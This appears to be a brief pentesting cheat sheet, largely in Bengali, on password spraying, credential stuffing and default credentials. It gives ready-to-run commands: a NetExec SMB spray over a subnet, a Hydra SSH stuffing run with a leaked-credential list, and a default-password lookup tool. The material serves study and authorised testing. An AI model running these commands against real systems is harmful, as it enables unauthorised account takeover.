# Spraying / Stuffing and Defaults - [LINK]()



* **Password Spraying:** একাধিক ইউজার অ্যাকাউন্টে একটি নির্দিষ্ট পাসওয়ার্ড (যেমন: ডিফল্ট পাসওয়ার্ড `ChangeMe123!`) ট্রাই করে অ্যাটাক দেওয়া। (অ্যাকাউন্ট লকআউট এড়াতে এই মেথড ব্যবহার করা হয়)।
* **Credential Stuffing:** পূর্বের কোনো ডাটা ব্রিচ থেকে পাওয়া লিক হওয়া ইউজারনেম ও পাসওয়ার্ডের লিস্ট অন্য কোনো সার্ভিসে ব্যবহার করে লগইন করার চেষ্টা করা। (মানুষের পাসওয়ার্ড পুনঃব্যবহারের অভ্যাসের সুযোগ নেওয়া হয়)।
* **Default Credentials:** নতুন ডিভাইস, রাউটার, ফায়ারওয়াল বা ডেটাবেস সেটআপের সময় যে ডিফল্ট ইউজারনেম-পাসওয়ার্ড থাকে, সেগুলো পরিবর্তন না করলে অ্যাটাকাররা তার সুবিধা নেয়।

## Attack Tools & Commands

### 1. Password Spraying

* **Target:** Active Directory (SMB Service)
* **Tool:** NetExec

```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'

```

*(অন্যান্য টুলস: Web Application-এর জন্য **Burp Suite**, Active Directory-র জন্য **Kerbrute**)*

### 2. Credential Stuffing

* **Target:** SSH Service
* **Tool:** Hydra
* **Format Required:** `username:password` যুক্ত ক্রাডেনশিয়াল ফাইল (`-C` ফ্ল্যাগ)

```bash
hydra -C user_pass.list ssh://10.100.38.23

```

### 3. Default Credentials Lookup

* **Tool:** `defaultcreds-cheat-sheet` (Python-based Tool)

```bash
# Installation
pip3 install defaultcreds-cheat-sheet

# Search default credentials for a vendor/product
creds search linksys

```
